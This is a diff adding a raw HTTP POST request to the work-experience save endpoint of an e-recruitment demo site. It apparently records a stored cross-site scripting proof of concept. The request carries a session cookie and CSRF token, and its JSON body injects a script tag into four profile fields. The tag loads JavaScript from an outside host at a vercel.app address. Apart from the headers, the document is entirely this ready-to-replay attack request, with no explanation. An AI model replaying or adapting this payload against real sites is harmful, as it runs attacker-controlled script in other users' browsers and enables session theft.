@@ -1,0 +1,24 @@
+POST /User/WMSaveWorkExp HTTP/1.1
+Host: erecruitment-demo.cimory.com
+Cookie: ASP.NET_SessionId=mxh52iwcakt5juvc0jeztzw1
+Content-Length: 506
+Sec-Ch-Ua-Platform: "Windows"
+X-Csrftoken: 1d2e8b1c-077c-ed6c-ed95-a7c18be2e0f8
+Sec-Ch-Ua: "Chromium";v="154", "Microsoft Edge";v="154", "Not A(Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36 Edg/154.0.0.0
+Accept: */*
+Dnt: 1
+Content-Type: application/json;
+Origin: https://erecruitment-demo.cimory.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://erecruitment-demo.cimory.com/Profile
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9,id;q=0.8
+Priority: u=1, i
+Connection: keep-alive
+
+{"CanExpId":0,"CanId":5,"FgMode":"I","CompName":"<script src=https://xss-payload-ten.vercel.app/a.js></script>","JobTitleId":0,"JobTtlCode":null,"JobTtlName":null,"JobStartStr":"","JobEndStr":"","CompAddress":"<script src=https://xss-payload-ten.vercel.app/a.js></script>","CompTypeId":"","BusinessTypeId":"","BusinessType":"","BusinessTypeOther":"","CompTypeName":"<script src=https://xss-payload-ten.vercel.app/a.js></script>","TermReason":"<script src=https://xss-payload-ten.vercel.app/a.js></script>"}
